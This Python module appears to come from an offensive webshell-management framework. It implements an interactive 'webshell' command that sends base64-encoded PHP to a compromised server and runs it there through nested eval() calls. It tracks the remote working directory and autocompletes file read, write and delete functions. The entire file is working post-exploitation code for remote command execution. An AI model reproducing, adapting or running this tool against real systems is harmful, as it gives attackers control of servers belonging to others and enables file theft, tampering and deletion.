from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode
from libs.app import readline

NEW_WORDLIST = {"common_wordlist": [
    "trim",
    "dirname",
    "strtolower",
    "strtoupper",
    "strcmp",
    "str_replace",
    "strstr",
    "md5",
    "array",
    "fopen",
    "is_readable",
    "is_writable",
    "is_executable",
    "fwrite",
    "file_put_contents",
    "file_get_contents",
    "fputs",
    "file",
    "basename",
    "scandir",
    "echo",
    "print_r",
    "var_dump",
    "mkdir",
    "rmdir",
    "unlink",
    "copy",
    "rename",
    "chdir",
]}


@alias(True, func_alias="ws")
def run(*commands):
    """
    webshell

    Get a webshell of target system or just run a webshell command.
    """
    if (len(commands)):
        command = " ".join((str(c) for c in commands))
        res = send((command))
        if (not res):
            return
        print(color.green("\nResult:\n\n") + res.r_text.strip() + "\n")
        return
    print(color.cyan("Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
    pwd = send(f'print(getcwd());').r_text.strip()
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    readline.set_wordlist(NEW_WORDLIST)
    try:
        while gget("loop"):
            print(f"webshell:{pwd} >> ", end="")
            data = readline(b"(")
            lower_data = data.lower()
            if (lower_data.lower() in ['exit', 'quit', 'back']):
                print()
                break
            if (data == ''):
                print()
                continue
            data = base64_encode(data)
            b64_pwd = base64_encode(pwd)
            if (lower_data.startswith("cd ") and len(lower_data) > 3):
                path = base64_encode(lower_data[3:].strip())
                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
                if (not res):
                    return
                pwd = res.r_text.strip()
            else:
                res = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{data}\'));");')
                if (not res):
                    return
                print("\n" + res.r_text.strip() + "\n")
    finally:
        readline.set_wordlist(wordlist)
